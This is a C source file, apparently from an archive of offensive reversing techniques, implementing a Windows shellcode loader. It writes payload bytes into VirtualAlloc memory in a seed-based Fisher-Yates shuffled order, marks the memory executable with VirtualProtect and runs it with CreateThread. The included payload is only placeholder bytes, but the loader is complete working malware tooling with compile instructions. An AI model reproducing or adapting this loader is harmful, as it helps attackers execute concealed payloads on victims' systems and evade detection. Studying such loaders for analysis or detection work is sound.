/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    fisher-yates shuffle
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>

// Fisher-Yates shuffle
void permutation (uint32_t index[], uint32_t size, uint32_t seed)
{
    uint32_t temp;

    // seed the random generator
    // alternative: use mersenne twister
    srand (seed);

    // start from the last element and swap one by one
    for (int i = size-1; i > 0; i--)
    {
        // pick random index from 0 to 1
        int j = rand() % (i + 1);

        // swap index[i] with the element at random index
        temp = index[i];
        index[i] = index[j];
        index[j] = temp;
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x37, 0x13, 0x00, 0x00, 0x90, 0xc3, 0x90, 0xcc, };
    uint32_t    payload_len = 8;
    uint8_t  *  ptr_runtime;
    uint8_t  *  ptr_payload;

    uint32_t *  indexes;
    uint32_t    idx;
    uint32_t    seed;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    payload_len -= sizeof(seed);
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // generate array of index
    indexes = (uint32_t*) HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, payload_len * sizeof(uint32_t));
    for (idx = 0; idx < payload_len; idx++) indexes[idx] = idx;

    // get the seed and do permutation
    seed = *(uint32_t*)payload;
    permutation(indexes, payload_len, seed);

    // copy to allocated buffer (skipping the seed at front)
    ptr_payload = (uint8_t*)payload + sizeof(seed);
    ptr_runtime = (uint8_t*)runtime;
    for (idx = 0; idx < payload_len; idx++) ptr_runtime[indexes[idx]] = ptr_payload[idx];

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);
    HeapFree (GetProcessHeap(), 0, indexes);

    return 0;
}